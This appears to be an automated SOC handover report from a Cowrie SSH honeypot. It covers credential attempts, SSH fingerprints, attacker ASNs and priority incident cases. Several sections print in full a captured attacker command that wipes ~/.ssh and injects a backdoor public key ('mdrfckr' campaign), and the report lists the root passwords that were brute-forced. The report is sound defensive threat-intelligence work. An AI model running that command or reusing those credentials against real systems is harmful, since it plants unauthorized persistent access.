# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-16 |
| **Generated At** | 2026-06-16T23:26:59Z |
| **Shift Time** | 23:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **275** |
| Confirmed Threats | **110** |
| False Positives Filtered | **165** (60.0%) |
| Unique Attacker IPs | **99** |
| Countries of Origin | **26** |
| High Severity Cases | **13** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **262** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **57** |
| Unique Credential Pairs | **48** |
| Unique Usernames | **38** |
| Unique Passwords | **41** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `user` | 4 |
| `345gs5662d34` | 3 |
| `server22` | 2 |
| `vendors` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 5 |
| `123456` | 5 |
| `345gs5662d34` | 3 |
| `123` | 3 |
| `user` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 5 |
| `345gs5662d34` | `345gs5662d34` | 3 |
| `user` | `user` | 3 |
| `server22` | `server22` | 2 |
| `root` | `AA@123123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `AA@123123` | `172.172.214.224` | 2026-06-16T21:01:18 |
| `root` | `3245gs5662d34` | `172.172.214.224` | 2026-06-16T21:01:46 |
| `root` | ` ` | `45.10.175.77` | 2026-06-16T21:29:22 |
| `root` | `qwerty1234` | `125.20.207.154` | 2026-06-16T21:40:54 |
| `root` | `Welcome2024` | `172.172.214.224` | 2026-06-16T22:03:35 |
| `root` | `root2025@` | `172.172.214.224` | 2026-06-16T22:21:54 |
| `root` | `administrator@123` | `172.172.214.224` | 2026-06-16T22:40:37 |
| `root` | `Root2026@` | `172.172.214.224` | 2026-06-16T22:58:55 |
| `root` | `tk123456` | `172.172.214.224` | 2026-06-16T23:25:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **275** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 59 |
| OpenSSH | 4 |
| AsyncSSH (Python) | 3 |
| Go SSH scanner | 3 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 51 | 8 |
| `acaa53e0a7d7...` | Mirai/variant | 4 | 4 |
| `fda360b1b4f4...` | Mirai/variant | 3 | 1 |
| `03a80b21afa8...` | Modern SSH client | 2 | 2 |
| `4c20a8895324...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 51 | 8 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 4 | — |
| `acaa53e0a7d7...` | OpenSSH | 4 | 4 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 3 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 2 | 2 | Modern SSH client |
| `4c20a8895324...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.172.214.224`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **99** |
| Unique ASNs | **63** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS31898` | Oracle Corporation | 11 | HIGH |
| `AS4134` | CHINANET BACKBONE | 8 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS36352` | HostPapa | 4 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS202662` | Hytron Network Services | 2 | HIGH |
| `AS3816` | COLOMBIA TELECOMUNICACIONES S.A. ESP BIC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (13)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e2cb499f3948

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 21:00 |
| **Last Seen** | 2026-06-16 21:01 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 21:00:59` | `cowrie.session.connect` |
| `2026-06-16 21:01:01` | `cowrie.client.version` |
| `2026-06-16 21:01:01` | `cowrie.client.kex` |
| `2026-06-16 21:01:18` | `cowrie.login.success` |
| `2026-06-16 21:01:19` | `cowrie.session.params` |
| `2026-06-16 21:01:19` | `cowrie.command.input` |
| `2026-06-16 21:01:19` | `cowrie.command.failed` |
| `2026-06-16 21:01:24` | `cowrie.log.closed` |
| `2026-06-16 21:01:26` | `cowrie.session.params` |
| `2026-06-16 21:01:26` | `cowrie.command.input` |
| `2026-06-16 21:01:26` | `cowrie.session.file_download` |
| `2026-06-16 21:01:26` | `cowrie.log.closed` |
| `2026-06-16 21:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd1d6c590bb

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 21:01 |
| **Last Seen** | 2026-06-16 21:01 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 21:01:37` | `cowrie.session.connect` |
| `2026-06-16 21:01:39` | `cowrie.client.version` |
| `2026-06-16 21:01:39` | `cowrie.client.kex` |
| `2026-06-16 21:01:46` | `cowrie.login.success` |
| `2026-06-16 21:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb133f6e438

| Field | Detail |
|---|---|
| **Source IP** | `45.10.175[.]77` |
| **First Seen** | 2026-06-16 21:29 |
| **Last Seen** | 2026-06-16 21:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 21:29:21` | `cowrie.session.connect` |
| `2026-06-16 21:29:21` | `cowrie.client.version` |
| `2026-06-16 21:29:21` | `cowrie.client.kex` |
| `2026-06-16 21:29:22` | `cowrie.login.success` |
| `2026-06-16 21:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.10.175[.]77` to AbuseIPDB if not already reported
- [ ] Block `45.10.175[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0d68152253

| Field | Detail |
|---|---|
| **Source IP** | `125.20.207[.]154` |
| **First Seen** | 2026-06-16 21:40 |
| **Last Seen** | 2026-06-16 21:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 21:40:50` | `cowrie.session.connect` |
| `2026-06-16 21:40:52` | `cowrie.client.version` |
| `2026-06-16 21:40:52` | `cowrie.client.kex` |
| `2026-06-16 21:40:54` | `cowrie.login.success` |
| `2026-06-16 21:40:55` | `cowrie.direct-tcpip.request` |
| `2026-06-16 21:40:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.20.207[.]154` to AbuseIPDB if not already reported
- [ ] Block `125.20.207[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2271ff41da6

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 22:03 |
| **Last Seen** | 2026-06-16 22:04 |
| **Session Duration** | 55s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 22:03:19` | `cowrie.session.connect` |
| `2026-06-16 22:03:22` | `cowrie.client.version` |
| `2026-06-16 22:03:23` | `cowrie.client.kex` |
| `2026-06-16 22:03:35` | `cowrie.login.success` |
| `2026-06-16 22:03:36` | `cowrie.session.params` |
| `2026-06-16 22:03:36` | `cowrie.command.input` |
| `2026-06-16 22:03:36` | `cowrie.command.failed` |
| `2026-06-16 22:03:38` | `cowrie.log.closed` |
| `2026-06-16 22:03:48` | `cowrie.session.params` |
| `2026-06-16 22:03:48` | `cowrie.command.input` |
| `2026-06-16 22:03:50` | `cowrie.session.file_download` |
| `2026-06-16 22:03:50` | `cowrie.log.closed` |
| `2026-06-16 22:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e1e081f92df

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 22:04 |
| **Last Seen** | 2026-06-16 22:04 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 22:04:00` | `cowrie.session.connect` |
| `2026-06-16 22:04:00` | `cowrie.client.version` |
| `2026-06-16 22:04:03` | `cowrie.client.kex` |
| `2026-06-16 22:04:12` | `cowrie.login.success` |
| `2026-06-16 22:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66cbad2e69d0

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 22:21 |
| **Last Seen** | 2026-06-16 22:22 |
| **Session Duration** | 53s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 22:21:47` | `cowrie.session.connect` |
| `2026-06-16 22:21:47` | `cowrie.client.version` |
| `2026-06-16 22:21:47` | `cowrie.client.kex` |
| `2026-06-16 22:21:54` | `cowrie.login.success` |
| `2026-06-16 22:21:57` | `cowrie.session.params` |
| `2026-06-16 22:21:57` | `cowrie.command.input` |
| `2026-06-16 22:21:57` | `cowrie.command.failed` |
| `2026-06-16 22:21:59` | `cowrie.log.closed` |
| `2026-06-16 22:22:02` | `cowrie.session.params` |
| `2026-06-16 22:22:02` | `cowrie.command.input` |
| `2026-06-16 22:22:18` | `cowrie.session.file_download` |
| `2026-06-16 22:22:18` | `cowrie.log.closed` |
| `2026-06-16 22:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dca4ef03439

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 22:22 |
| **Last Seen** | 2026-06-16 22:22 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 22:22:29` | `cowrie.session.connect` |
| `2026-06-16 22:22:29` | `cowrie.client.version` |
| `2026-06-16 22:22:30` | `cowrie.client.kex` |
| `2026-06-16 22:22:39` | `cowrie.login.success` |
| `2026-06-16 22:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-595ac2de5d38

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 22:40 |
| **Last Seen** | 2026-06-16 22:41 |
| **Session Duration** | 86s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 22:40:20` | `cowrie.session.connect` |
| `2026-06-16 22:40:21` | `cowrie.client.version` |
| `2026-06-16 22:40:22` | `cowrie.client.kex` |
| `2026-06-16 22:40:37` | `cowrie.login.success` |
| `2026-06-16 22:40:58` | `cowrie.session.params` |
| `2026-06-16 22:40:58` | `cowrie.command.input` |
| `2026-06-16 22:40:58` | `cowrie.command.failed` |
| `2026-06-16 22:40:59` | `cowrie.log.closed` |
| `2026-06-16 22:41:10` | `cowrie.session.params` |
| `2026-06-16 22:41:10` | `cowrie.command.input` |
| `2026-06-16 22:41:23` | `cowrie.session.file_download` |
| `2026-06-16 22:41:23` | `cowrie.log.closed` |
| `2026-06-16 22:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06ff047a50ee

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 22:41 |
| **Last Seen** | 2026-06-16 22:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 22:41:44` | `cowrie.session.connect` |
| `2026-06-16 22:41:45` | `cowrie.client.version` |
| `2026-06-16 22:41:45` | `cowrie.client.kex` |
| `2026-06-16 22:41:46` | `cowrie.login.success` |
| `2026-06-16 22:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf1d7fcdc2ef

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 22:58 |
| **Last Seen** | 2026-06-16 22:59 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 22:58:46` | `cowrie.session.connect` |
| `2026-06-16 22:58:49` | `cowrie.client.version` |
| `2026-06-16 22:58:49` | `cowrie.client.kex` |
| `2026-06-16 22:58:55` | `cowrie.login.success` |
| `2026-06-16 22:58:57` | `cowrie.session.params` |
| `2026-06-16 22:58:57` | `cowrie.command.input` |
| `2026-06-16 22:58:57` | `cowrie.command.failed` |
| `2026-06-16 22:58:59` | `cowrie.log.closed` |
| `2026-06-16 22:58:59` | `cowrie.session.params` |
| `2026-06-16 22:58:59` | `cowrie.command.input` |
| `2026-06-16 22:58:59` | `cowrie.session.file_download` |
| `2026-06-16 22:58:59` | `cowrie.log.closed` |
| `2026-06-16 22:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6f8b7e04de8

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 22:59 |
| **Last Seen** | 2026-06-16 22:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 22:59:06` | `cowrie.session.connect` |
| `2026-06-16 22:59:06` | `cowrie.client.version` |
| `2026-06-16 22:59:06` | `cowrie.client.kex` |
| `2026-06-16 22:59:12` | `cowrie.login.success` |
| `2026-06-16 22:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6af24f378e35

| Field | Detail |
|---|---|
| **Source IP** | `172.172.214[.]224` |
| **First Seen** | 2026-06-16 23:25 |
| **Last Seen** | 2026-06-16 23:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 23:25:30` | `cowrie.session.connect` |
| `2026-06-16 23:25:31` | `cowrie.client.version` |
| `2026-06-16 23:25:31` | `cowrie.client.kex` |
| `2026-06-16 23:25:32` | `cowrie.login.success` |

**Recommended Actions:**
- [ ] Submit `172.172.214[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.172.214[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `152.200.205[.]179` | **20** | 2026-06-16 21:08 | 2026-06-16 21:52 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.172.214[.]224` | **16** | 2026-06-16 21:01 | 2026-06-16 23:16 | 3m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `116.110.218[.]1` | **3** | 2026-06-16 22:39 | 2026-06-16 22:41 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.125[.]26` | **2** | 2026-06-16 22:34 | 2026-06-16 22:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.202[.]190` | 1 | 2026-06-16 23:05 | 2026-06-16 23:06 | 30s | 0 | `T1592` | 🟢 LOW |
| `111.70.11[.]78` | 1 | 2026-06-16 21:28 | 2026-06-16 21:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.121.204[.]181` | 1 | 2026-06-16 22:13 | 2026-06-16 22:14 | 16s | 0 | `T1592` | 🟢 LOW |
| `114.219.157[.]97` | 1 | 2026-06-16 22:18 | 2026-06-16 22:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.178.75[.]243` | 1 | 2026-06-16 23:24 | 2026-06-16 23:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.245.139[.]85` | 1 | 2026-06-16 21:55 | 2026-06-16 21:55 | 14s | 0 | `T1592` | 🟢 LOW |
| `117.67.151[.]76` | 1 | 2026-06-16 21:07 | 2026-06-16 21:08 | 31s | 0 | `T1592` | 🟢 LOW |
| `124.71.108[.]82` | 1 | 2026-06-16 22:15 | 2026-06-16 22:16 | 30s | 0 | `T1592` | 🟢 LOW |
| `129.151.149[.]255` | 1 | 2026-06-16 23:22 | 2026-06-16 23:22 | 30s | 0 | `T1592` | 🟢 LOW |
| `132.145.81[.]75` | 1 | 2026-06-16 23:16 | 2026-06-16 23:17 | 30s | 0 | `T1592` | 🟢 LOW |
| `135.13.28[.]35` | 1 | 2026-06-16 21:49 | 2026-06-16 21:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.121[.]78` | 1 | 2026-06-16 22:56 | 2026-06-16 22:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.204[.]161` | 1 | 2026-06-16 23:18 | 2026-06-16 23:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `154.83.98[.]132` | 1 | 2026-06-16 23:09 | 2026-06-16 23:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `155.103.67[.]152` | 1 | 2026-06-16 23:08 | 2026-06-16 23:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `156.229.167[.]182` | 1 | 2026-06-16 22:14 | 2026-06-16 22:14 | 30s | 0 | `T1592` | 🟢 LOW |
